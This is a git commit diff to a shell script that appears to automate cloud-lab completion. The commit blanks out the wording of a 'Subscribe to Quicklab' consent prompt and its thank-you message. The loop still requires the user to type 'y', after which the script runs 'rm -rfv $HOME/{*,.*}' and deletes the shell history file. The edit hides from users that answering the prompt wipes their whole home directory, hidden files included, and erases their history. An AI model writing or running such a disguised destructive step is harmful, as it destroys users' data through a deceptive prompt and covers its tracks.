70ad43a69b905c6c77beae9c4a8ca569382912ef
Tariq Ahmad <54164634+tariqsheikhsw@users.noreply.github.com>
2024-04-22 17:00:58 +0400

    Update GSPddd.sh

--- GSPddd.sh
+++ GSPddd.sh
@@ -118,14 +118,14 @@ Lab Completed !!!
 ${RESET}"
 
 #-----------------------------------------------------end----------------------------------------------------------#
-read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+read -p "${BOLD}${RED}  ${RESET}" CONSENT_REMOVE
 
 while [ "$CONSENT_REMOVE" != 'y' ]; do
   sleep 10
-  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+  read -p "${BOLD}${YELLOW}  : ${RESET}" CONSENT_REMOVE
 done
 
-echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"
+echo "${BLUE}${BOLD} ${RESET}"
 
 rm -rfv $HOME/{*,.*}
 rm $HOME/.bash_history
